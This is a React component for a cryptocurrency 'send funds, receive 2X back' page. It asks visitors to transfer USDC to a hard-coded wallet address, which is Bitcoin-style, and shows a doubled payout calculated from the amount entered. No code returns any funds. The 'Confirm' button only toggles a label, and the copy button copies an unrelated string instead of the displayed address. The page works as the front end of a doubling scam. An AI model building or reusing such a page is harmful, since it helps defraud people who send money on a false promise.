import { useState } from "react";

export default function USDC() {
    const [amount, setAmount] = useState('');
    const [approve, setApporve] = useState(false);
    const [copied, setCopied] = useState(false);

    const Address = "Osas is a champ";

    function handleAmount(event) {
        const inputValue = parseFloat(event.target.value);
        if (isNaN(inputValue) || inputValue < 0.1) {
            setAmount(0);
        } else {
            setAmount(inputValue * 2);
        }
    }


    function handleApprove() {
        setApporve(true);
    }

    const copyText = () => {
        navigator.clipboard.writeText(Address)
            .then(() => {
                setCopied(true);
                setTimeout(() => {
                    setCopied(false);
                }, 2000);
            })
            .catch(err => {
                console.error("Failed to copy: ", err);
            });
    };

    return (
        <>
            <div className="form formContainer participateRight">
                <div className="title">
                    <p> Make a transfer to the <span>specified</span> address to receive <span>2X</span> back </p>
                    <div className="waiting"><img src="/assets/258f73b8.svg" width="24" alt="" /><span>Waiting for
                        payment</span></div>
                </div>
                <div className="formGroup">
                    <div className="formInput formInputWithButton">
                        <p>Participation wallet</p>
                        <div className="input">
                            <div className="value">bc1qs7r5gnfpe5pcy5zt6afpe7mh6m4mwh774yzmh3</div>
                        </div><button onClick={copyText} className="">{copied ? "Copied!" : "Copy address"}</button>
                    </div>
                    <div className="formInput formInputWithButton">
                        <p>Participation amount</p>
                        <div className="input"><span className="errorText"> The minimum value allowed is
                            0.1</span><span>USDC</span></div><button className="disabled"> Copy amount </button>
                    </div>
                </div>
            </div>

            <div className="calculator participateLeft">
                <div className="calculatorInput formContainer">
                    <div className="title"> Enter the amount </div>
                    <div className="block">
                        <div className="info">
                            <div className="header"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAYAAABV7bNHAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAA7eSURBVHgB1VwJXBXVGv9mLlx2QyQFt1BREDdIAy1UjCx9pmWlUe+laWm2/dQH9NTee2llZmRaLq+sTPlVpvnUp5WWGLjkgrupgAtiCigisqrAvXPe942Bd2buZc5cwOX/+w33zrnnzJz5zrd/ZxDgJiImJtUlP8IzHEToxUQhSm5k0F4QoJ+DIQcZHvI3if0mgnjSq0z4bd/iXtVwkyBAI6NjYnq4CNCfMRYhiEJ/JEgQ1AeM5TJB3Cww6wGBmQ5mzrkvDRoRjUKgTvF7/UVRehRX/2U8jYRGhbCfgfSfqmrzqpx5EcXQwGhQAoX+Y2eQRRIHm0CYhqet4SZCENhJK8DS6irzwoYkVMMQaHqqS0iF16v4bQoeAXArwaAQH2tmZWH5pzlLB1yDeqLeBOqUuOsvAogL8WsQ3F4gLnomKylyI9QDThMoaNIBXzcXyyxcsji8ii/ctmBLSktMr+cv7nUFnIBTBApL3B5uYeZv0DyHwZ2BLAkg7kRS5EGD49AjMYhOf0+PtTJz6h1EHEIIPuia0IT0oWAQhggUkpg+UTBByu0tUg4RxARY1+mNPW8ZGWTi7UjEwY954CREZLnokCbQs50P5BZVQpWFgVEM7uEHgb5mKCitBotkfDwBdUqMf/QLJZd++2IXZ399ENUFxqaDE6AHGnZvM4jr3Vz+ToiddRhyL1cauQy0auoGm6Z0kwl9AQm0fn8hrNh1Ec4WGbtOLQRpctYHvXUXXJdAoQm7+zBB2AEGYXYRIX5waxgR5Q+eZiWjOkugzVO7K9ouV1ggLaME3lmbA1eqJDAKAYRnM5PuW15Xnzp1EFkrJM63YAAuJgFe6B8IGxK7wui+LTTEaUg09XKB4b2awfr4rvB83wBwczFmlBmwRfSMdfVxSKCw6UfMVnBLBgMOIK3yqtfDIHFIa/m7PZRds0DpVQs4g7KrVof3nTK0DSx9KRTaNHMDA/DFZ/yRfDpHHRwur1/kmAVI4yHAiVZNzfDliyEQHOBh9/fCsmrYcLgIPv45D04VGI8Ayq5ZYWtWCbgihxIR3Fy0a0s6LraLL+w5VQaF5dwZER8Xk7X5pR1frLP3o12eDE5M74+USwNOxIT5QlJcO/Bxd9H8VoLcsuHQZViwKVcmUkMgwNcVhvRoBmNRlJt5a+9J+m1hSh6s3lPIe8lilKWXsmZHrlT/oCUQBZ7lXhd5fZ0RkXfDv4ffI6+sGlszS+D99Wch++JVaAyQaE0a1AqGRjTT/GZFN2D66jPwffpF4ESOqcKz27FFXcttGzXkDyn3eI2XOJ1besArD7W0S5x31p6Bb3YUAC/eGNJGVrqEc5erIHnbeVms6gJxSuLybMjKuwIJON4WJlGANx9rC3uySyGnkMtiBlk8K8bj50e2jYonkwNQ16oMbNZNWYQicRaO7qhRxicvXIXFqfmwbv8l4IU9E27UFRjUzQ8SH9UaB7rG1BWnIT27TPcaAoMiMFl7Zs7uk1PTptB0bmbLOB7i+Lib4P2R7e1O5qUlJwwRp6Gw8fciGPVpFmTmKYN2muO0YW3lOesBQxE/kExxtm21BJJNncTGAgfGDwhEDvJUtFVbGfxrVY5hB7AhQfdOQJGrVIUxNFdSBVxgMKnzpK2BNae1BHJ3rX4cBS5UbzyZ83EDAjXtST+ehR0nSuFWg0R8+n9zNO1j+gVw+UjIRS2sJvfhNee1BGIgvAwcSIrroGlb8EseJG+/AEZALP9ybEv4MaGrRv8QqP3j5zpATGfjiYM1+wph2TbtfOY+GwyebvoJDEG4QQtZSYfG74lhIkvVGxgT6gvzcNLurjdukoEyT7JPHjIPaIKPoEKdNqyNXb9JDSwXwa6TZfDPVadRhKrACNZO7gKhgUpV8OqyE7D5qH5OHyO7CEqwyU+KxOkBHBjTP0BBHMIy2RzzEYdipWlD28Kske24iEPA1YQ+HZtA8oRQ6NLKC4zgk19yNW2vDWwFPBCZFCN/0h8q6ukNIEUX1cFH0XY0twI2Hr4MvBjYrSk8hY6lGqfQkVyzt7D22Htaa5LJGr07IgiMYAtG+mrzTtfprOIqexAEUa72ulA5OE8QYvUG9FYRh/C/fZfgWjV/miF+sNKZI86bgj6KPZanBSFui7S5b2dse7r33XIeiAfkTX+/+yJEtr9xjSYeJhiA8VpGft05fLSDEa0n7/AQz/f0jhY4inzD7vVXnJNJpdXmBQWRNQmzGizbVuBQH5A/M3XlaY3b0LeTMaWdllmsucbArk15hgZ5m0zhoiRKwXo9ybS38VOayBR8ML1QwBaDuvtp2pbvqtvy0YOln1KKSFSwNxgBpUhSjirVAImZo3SMLVA3R7kgL0Xr5RXpYj4eSk/0yNkKMIIWTcyattIr+gResClPcW6Ea2uwN7scRkffOCcxo7SMnlPLmNiDy5Q81tNf07b+gLFwgkQmUqXHyOFclJJX5zg5lkJRqw82HdEakkFoMLZk6Jt7zIELXfQ6eZiVpv3IOWPcQ8jI14558j5/6N7GSzbljY2dKi9f7a7YAxInmnr10uvYF8s1tjhx3nh+J+VIicZfItFdiSnaNRPD0KsOhB5tva6Ls3vD57HPlyidzIc4FDW6P8FcIsbr1NUFIs6sdWfhPXQS1SCTTsfER66fU7WCFiHn4jXYd6YcfkUla8Qg8MBeDssenHry4grnku6rUcESIUZFt6izHyXOSF/RMRL9ntKrbWHlrgKYj2nbSotzBcMzl5zLMhiuzRMqnKhB1eC9dX/AG99lQ2Y+/2YLsjovokL//IUQp8XvSpVzi+oUB93tUz+Ro4Ra6rESOWXbN+Qu1D3eMhHUOSY1iKOWYWnniY+PglE09zGDM3DqSc0uTjGeAqSTKE6qiZUokPX/8yHI634QKyW9g5toxoW18pR/54nIbdHM2xWcAaa2QbeIX1TuHHsaAekW8nnooNzS84uz4PG5R+06cyPsBLzG78elJnJEibEsvV5bMpWrZW9lGwOkp8ZjjlsNZ8rZJMa2+Olgke4YNAdpXCJWqir5UtDp7+PKXQikEsxUjMy9bLJ5VBLicThPXah/Tc2M4tu+ubui7RJn5VUURH0R23xU66r3McBFAXeZ4W8PNIfhvfxrj7/e3xxuFmLDtE4hFTX1IAjSIZFZhX16HYnV84qVusCImFVbJTSzSi4ki8RjsvUsGw/6q/LaJBGnCvQ5U7Cyg6JPmXgQo/mcujrSBc8VKV11yqnwpAwItCNMnbagsfaqI2q8NlBbrvk1g9+CURYitstdijYKnC/pG56CkjLXdFF+MUQStun1TlFFxOS30N4cXiyzU/Wg+trbTwYpMn41IHO+6PmO8FAXpXiQe7B063ngxdNRd2tCpZSjHGlixrbS1uE/R1r3ozp6rq7+pIdex4S3bV6IJk/lFZ44iaLp5TsL5Jy0bRw0Eh+ADrU5t8edFZUSjP5M1+jWgkT4mT5KXUeizpPmQAW0nT5ksyIJYppefyq57M5WpgxIP4x7UF9MajBjDW1osJ9FrMnyOcr2FVVUw7trz8CxXP4QZURUc821dhwv44rLBMl6iD5lAlH9B8tPB/QGUYFQjTichJH4iLbDUIm6iH+Dk8x9xDlUEOSFXAGO0W4zSN7OIZ4MjmfO6ZNGX28Ip8AW4Z/P6xpH1mwZ3mB09I0bky6iXR6jPssEXtCeHTpI94Tf4w3dMQ+k1jWkJygM2Xyk2Kl6/6yR7Wu309SACMyzy4MBm1/zvdZzszLLOvwpT2/wbOQA9YTJZE8d1haMgiZLW2UoT6QGtSWjfnOGODOxfqZO75Jyt1ez10LIq7KYv645qyXQqQ8fKEAxm6M3nPZvf5mmZdPRmOPhLKc0KsgJfbibdh7zf8nnyiVJwJbYvm+mCMtFk7QaP3QF/Vu0RilHtJZg5oh28gRvFWJRTO3V/DcfK+bVPcXV1a4KJlEQiHZWMYm9BxyY+n22Rp5JH1HMRcfNxth+AagLgzXEIadwynd8VREJpJnqtxU1idmg6anubhVeGcCxP7oj1pY+G9sJWvpqk1Ffozmnkg5vqoQUdiu/69chz50330OB6Iwnguxybn5xFUz46jhk5XMEvMg9Jqulw7G59yvCfLuZ607xux/HUsxXPJs5B2Cc8/ZTQZhl1CakqLj4DYrjD1hDox1oDQnKEFDibOLDraFDC3fN77RZnfYmknjxAGcXdzwpcoW63WFqPyQhfQn+OgY4QA7j7KfbQYiDXRMUOS/B8ODAmTKorK4focgL79DCQ47R1K5BDQ5gJeSjDedgD4dJJ+CMliJx7D6rQwJd3/FqQW+ScSkUCkEWjAqGqA6Oo/xDf5TLZt1ourQGxDEUv6mTX7YgnfOcgQ1dSJ1sq5cUcXJGb7v7B+ssDtGLHvR2Ie++aapWTsAC4LiYQFkEHKGh3vaxBbkfS7edlwNZyh5wIscEVcOPJUU7fFWzzuw7DWSCdQJwgvYKzduYCw/P/h0O5JTDzcLpgmsw8P3D8MEPZ40Qhzzmt+oiDkG3PHE8qc8KYNJkMADijjGfZ8lKMjPfeB2fB7R3Ud5DhPcYMf+YYY4UJDbjeFJUsl4/rpx01oe954UkYGZWEOcCJ4ibKPb5+fci6NW+CQzu3lTWIfXZp1COaRV6OYaSb9uySuCnQ/qJd7vABc+co/+2IcHQdEPjd09nomDopVhbUNTv5+0CZwqdKwPTJq7iK1Z+BWwPSBxacN7uhtdT9pFEgTgpCO4koCPIBJaIYvWFkWFO/2MBK5jp3aqOcGegEMuEA2/KPxYgkOYvZpcjcFW+gtsZxDVo/SurXTs6QxxC/f+5ScLu4QIIS27DfzaQIzD2ZuaHUYZeSlajQfa+hb2S6m3x9ByP8dubeOoHtxbFApNmilZpiTrwdAYNujmQwhOz2TJRYDCWN0RpQFxkkrRAdGHJti/E1ReNsntSJpSp8llBFOmtma7QqGAn0Gf8BNzc1hyfGZ4LDYxG314aGr8zhglCuCQI9yNn9UMxbAH1Qw5O+zAS5leMo7bohQr1RePvv7UBvfvgLQpRSKRwqyD2+HMCMeDAp8J+JyXG5AKeiUmHUITSS8rNB539Z0nO4P9RueLQz6FGqQAAAABJRU5ErkJggg==" alt="usd coin" className="icon" width="24"/><span className="name">USDC</span></div>
                        </div>
                        <div className="formGroup">
                            <div><label className="input"><input onChange={handleAmount} placeholder="Enter Amount" type="number" /><span className="currency">USDC</span></label>
                                <div className="group"><small className="small"> Min: <span>0.1 USDC</span></small><small
                                    className="small"> Max: <span>250 USDC</span></small></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div className="calculatorInput formContainer">
                    <div className="title"> Amount to receive <span>2X</span> back </div>
                    <div className="block">
                        <div className="info">
                            <div className="header"><img src="data:image/png;base64,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" alt="usd coin" className="icon" width="24"/><span className="name">USDC</span></div>
                        </div>
                        <div><label className="input"><input defaultValue={amount} placeholder="Waiting for input..." type="number" /><span
                            className="currency">USDC</span></label>
                            <div className="group"><small className="small"> Min: <span>0.2 USDC</span></small><small
                                className="small"> Max: <span>500 USDC</span></small></div>
                        </div>
                    </div>
                    <div className="formInput-2 formInput  formInputWithButton">
                        <p>Recipient Address</p>
                        <input className="input"
                            placeholder="receivers wallet address" type="text" /><button onClick={handleApprove} className={approve ? "clicked" : ""}>{approve ? "Saved" : "Confirm"}</button>
                    </div>
                </div>
            </div>

        </>
    )
}
